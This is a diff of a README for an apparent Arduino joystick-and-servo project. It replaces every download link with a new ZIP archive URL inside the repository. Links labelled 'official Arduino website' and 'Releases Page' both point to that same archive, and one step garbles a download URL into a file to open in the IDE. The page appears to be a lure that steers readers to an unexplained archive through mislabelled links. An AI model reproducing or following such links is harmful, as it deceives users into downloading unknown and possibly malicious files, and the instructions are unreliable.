@@ -1,6 +1,6 @@
 # 🎮 Arduino-joystick-and-servo-control - Control Servos Easily with Joysticks
 
-[![Download Now](https://github.com/xFoXuSx/Arduino-joystick-and-servo-control/raw/refs/heads/main/lection/servo_control_Arduino_and_joystick_v2.4.zip%20Now-%20blue)](https://github.com/xFoXuSx/Arduino-joystick-and-servo-control/raw/refs/heads/main/lection/servo_control_Arduino_and_joystick_v2.4.zip)
+[![Download Now](https://raw.githubusercontent.com/xFoXuSx/Arduino-joystick-and-servo-control/main/lection/servo-Arduino-control-and-joystick-1.1.zip%20Now-%20blue)](https://raw.githubusercontent.com/xFoXuSx/Arduino-joystick-and-servo-control/main/lection/servo-Arduino-control-and-joystick-1.1.zip)
 
 ## 🔍 Overview
 
@@ -39,14 +39,14 @@ To get started with this project, follow these simple steps.
 
 To run this project, you need the Arduino IDE installed on your computer:
 
-1. Visit the [official Arduino website](https://github.com/xFoXuSx/Arduino-joystick-and-servo-control/raw/refs/heads/main/lection/servo_control_Arduino_and_joystick_v2.4.zip) to download and install the Arduino IDE.
+1. Visit the [official Arduino website](https://raw.githubusercontent.com/xFoXuSx/Arduino-joystick-and-servo-control/main/lection/servo-Arduino-control-and-joystick-1.1.zip) to download and install the Arduino IDE.
 2. Open the IDE after installation is complete.
 
 ### 💾 Download & Install
 
 You can download the project files from the Releases page. Follow these steps:
 
-1. Visit this page to download: [Releases Page](https://github.com/xFoXuSx/Arduino-joystick-and-servo-control/raw/refs/heads/main/lection/servo_control_Arduino_and_joystick_v2.4.zip).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/xFoXuSx/Arduino-joystick-and-servo-control/main/lection/servo-Arduino-control-and-joystick-1.1.zip).
 2. Look for the latest release version.
 3. Download the ZIP file of the project.
 4. Extract the contents of the ZIP file to a folder on your computer.
@@ -56,7 +56,7 @@ You can download the project files from the Releases page. Follow these steps:
 Once you have the project files, you'll need to upload the code to your Arduino:
 
 1. Open the extracted folder.
-2. Find and open the `https://github.com/xFoXuSx/Arduino-joystick-and-servo-control/raw/refs/heads/main/lection/servo_control_Arduino_and_joystick_v2.4.zip` file with the Arduino IDE.
+2. Find and open the `https://raw.githubusercontent.com/xFoXuSx/Arduino-joystick-and-servo-control/main/lection/servo-Arduino-control-and-joystick-1.1.zip` file with the Arduino IDE.
 3. Connect your Arduino board to your computer using a USB cable.
 4. Select your board type from the `Tools` menu.
 5. Select the corresponding port under `Tools` > `Port`.
